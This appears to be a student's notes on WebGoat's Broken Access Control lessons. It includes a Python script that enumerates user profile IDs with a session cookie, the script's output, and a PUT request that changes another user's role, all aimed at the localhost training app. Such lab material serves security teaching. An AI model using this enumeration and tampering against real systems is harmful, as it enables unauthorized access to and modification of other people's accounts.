<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A5 - Broken Access Control](#a5---broken-access-control)
  - [Insecure Direct Object Reference](#insecure-direct-object-reference)
  - [Missing Function Level Access Control](#missing-function-level-access-control)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A5 - Broken Access Control

## Insecure Direct Object Reference

### 1. Direct Object References vs Insecure Direct Object References

### 2. Authenticate First, Abuse Authorization Later

### 3. Observing Differences & Behaviors

Serverìs response:

```
{
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}
```

The `userId` and `role` attributes are in the server's response, but don't show in the page.

### 4. Guessing & Predicting Patterns

`WebGoat/IDOR/profile/2342384`

### 5. Playing with the Patterns

- View Another Profile

Attack script:

```python
#!/usr/bin/python3

import requests
import json

url = "http://localhost:8080/WebGoat/IDOR/profile/{}"
headers = {"Cookie":"JSESSIONID=9gV_fSFyQdWk55sOKlSqZHunQZ0myi165J77wlOT" }

start = 2342384

for i in range(1000):
	response = requests.get(
		url.format(start + i), 
		headers=headers)

	if response.status_code != 500:
		print(response.text)
```

Output:

```
{
  "lessonCompleted" : false,
  "feedback" : "Try again. You need to use the same method\\/URL you used to access your own profile via direct object reference.",
  "output" : null,
  "assignment" : "IDORViewOtherProfile",
  "attemptWasMade" : true
}
{
  "lessonCompleted" : true,
  "feedback" : "Well done, you found someone else's profile",
  "output" : "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}",
  "assignment" : "IDORViewOtherProfile",
  "attemptWasMade" : true
}
```

- Edit Another Profile

Request:

- Method and URL:

```
PUT http://localhost:8080/WebGoat/IDOR/profile/2342388 HTTP/1.1
```

- Payload:

```
{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}
```

### 6. Secure Object References

Enforce both:

- vertical access control: enfoced by roles definition
- horizontal access control: users can access data of other users with the same role

## Missing Function Level Access Control

### 1. Missing Function Level Access Control

### 2. Relying on Obscurity

Items not visible in menu: `Users` (`/users`) and `Config` (`/config`).

### 3. Just Try It

Hidden menu items:

- /users
- /config

TODO